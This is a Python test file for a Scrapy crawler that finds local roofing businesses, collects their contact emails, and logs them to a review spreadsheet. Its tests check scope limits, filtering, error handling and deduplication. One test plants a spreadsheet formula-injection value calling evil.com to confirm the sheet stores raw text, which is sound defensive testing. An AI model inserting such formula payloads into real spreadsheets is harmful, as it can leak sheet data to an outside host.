import json
import unittest
from types import SimpleNamespace
from unittest.mock import Mock, patch
import scrapy
from scrapy.http import HtmlResponse, TextResponse
from scrapy.exceptions import CloseSpider
from aibuds_crawler.discovery import business_url, domain_key, lead_id, qualify
from aibuds_crawler.spiders.lead_pipeline import LeadPipelineSpider
from aibuds_crawler.guard import PublicTargetGuard
from aibuds_crawler.sheets import ReviewSheet, HEADERS


def spider():
    s = LeadPipelineSpider(industries="roofing", locations="New Martinsville, WV", write_to_sheets="false")
    s.api_key, s.search_domain = "test-secret", "google.com"
    s.crawler = SimpleNamespace(stats=Mock())
    return s


def search_response(s, results, status=200):
    req = next(s.start_requests())
    return TextResponse(req.url, request=req, status=status, encoding="utf-8",
                        body=json.dumps({"status":"success", "url":"https://www.google.com/search?q=roofing", "organicResults": results}).encode())


class PipelineTests(unittest.TestCase):
    def test_discovery_needs_no_website_input_and_sends_documented_payload(self):
        req = next(spider().start_requests())
        self.assertEqual(req.method, "POST")
        self.assertEqual(req.url, "https://api.zyte.com/v1/search")
        self.assertEqual(json.loads(req.body)["include"], ["organic"])
        self.assertIn("New Martinsville", json.loads(req.body)["query"])
        self.assertIn(b"Basic ", req.headers["Authorization"])
        PublicTargetGuard().process_request(req, spider())

    def test_search_filters_directories_and_duplicate_registered_domains(self):
        s = spider()
        rows = [{"url":u} for u in ["https://yelp.com/biz/roof", "https://roofbusiness.com/", "https://www.roofbusiness.com/contact", "https://127.0.0.1", "https://otherroof.com/"]]
        requests = list(s.parse_search(search_response(s, rows)))
        self.assertEqual(len(requests), 2)
        self.assertEqual(len(s.seen_domains), 2)
        self.assertEqual(lead_id("https://www.roofbusiness.com"), lead_id("https://roofbusiness.com/contact"))

    def test_search_failure_never_becomes_empty_success(self):
        with self.assertRaises(CloseSpider):
            list(spider().parse_search(search_response(spider(), [], 403)))

    def test_requires_bounded_scope(self):
        for kwargs in [{}, {"industries":"roofing", "locations":"WV", "max_businesses":51},
                       {"industries":"a;b;c;d", "locations":"x;y"}]:
            with self.subTest(kwargs=kwargs), self.assertRaises(ValueError):
                LeadPipelineSpider(**kwargs)

    def test_full_business_aggregation_and_evidence(self):
        s = spider()
        req = list(s.parse_search(search_response(s, [{"url":"https://roofbusiness.com/", "title":"Roof Business"}])))[0]
        body = b'<body>Roofing in New Martinsville. Request a quote. owner@roofbusiness.com <a href="/contact">Contact</a><script type="application/ld+json">{"@type":"RoofingContractor","name":"Roof Business"}</script></body>'
        output = list(s.parse_business(HtmlResponse(req.url, request=req, body=body, encoding="utf-8")))
        self.assertEqual(len(output), 1)
        self.assertIsInstance(output[0], scrapy.Request)
        contact = output[0]
        output = list(s.parse_business(HtmlResponse(contact.url, request=contact, body=b'<body>owner@roofbusiness.com jamie@example.com</body>', encoding="utf-8")))
        self.assertEqual(len(output), 1)
        lead = output[0]
        self.assertEqual(lead["business_name"], "Roof Business")
        self.assertEqual(len(lead["emails"]), 1)
        self.assertEqual(len(lead["emails"][0]["source_urls"]), 2)
        self.assertEqual(lead["qualification"], "potential_fit")
        self.assertFalse(lead["outreach_approved"])
        self.assertEqual(len(lead["fit_evidence"]), 3)

    def test_http_failure_retains_review_record(self):
        s = spider()
        req = list(s.parse_search(search_response(s, [{"url":"https://roofbusiness.com/"}])))[0]
        lead = list(s.parse_business(HtmlResponse(req.url, request=req, status=403)))[0]
        self.assertEqual(lead["qualification"], "needs_review")
        self.assertEqual(lead["emails"], [])
        self.assertTrue(lead["collection_errors"])

    def test_search_snippet_alone_cannot_qualify(self):
        s = spider()
        req = list(s.parse_search(search_response(s, [{"url":"https://roofbusiness.com/", "snippet":"Roofing New Martinsville"}])))[0]
        lead = list(s.parse_business(HtmlResponse(req.url, request=req, body=b'<body>owner@roofbusiness.com</body>', encoding="utf-8")))[0]
        self.assertEqual(lead["qualification"], "needs_review")
        self.assertFalse(lead["industry_match"])

    def test_sheet_uses_raw_and_skips_duplicate_ids(self):
        session = Mock()
        session.request.return_value.status_code = 200
        session.request.return_value.json.side_effect = [{"values":[HEADERS]}, {"updates":{}}]
        sink = ReviewSheet("a"*30, "Lead Review", session)
        sink.prepare()
        s = spider()
        req = list(s.parse_search(search_response(s, [{"url":"https://roofbusiness.com/"}])))[0]
        lead = list(s.parse_business(HtmlResponse(req.url, request=req, body=b'<body>Roofing New Martinsville owner@roofbusiness.com</body>', encoding="utf-8")))[0]
        lead["business_name"] = '=IMPORTXML("https://evil.com","//x")'
        self.assertEqual(sink.save(lead), "saved_for_review")
        self.assertEqual(sink.save(lead), "duplicate_skipped")
        self.assertEqual(session.request.call_args.kwargs["params"]["valueInputOption"], "RAW")
        self.assertEqual(session.request.call_count, 2)

    def test_sheet_refuses_existing_outreach_schema(self):
        session = Mock()
        session.request.return_value.status_code = 200
        session.request.return_value.json.return_value = {"values":[["Name", "Email", "Status"]]}
        with self.assertRaises(ValueError):
            ReviewSheet("a"*30, "Lead Review", session).prepare()
        self.assertEqual(session.request.call_count, 1)

    def test_sheet_auth_failure_is_not_success(self):
        session = Mock()
        session.request.return_value.status_code = 403
        with self.assertRaises(RuntimeError):
            ReviewSheet("a"*30, "Lead Review", session).prepare()


if __name__ == "__main__":
    unittest.main()
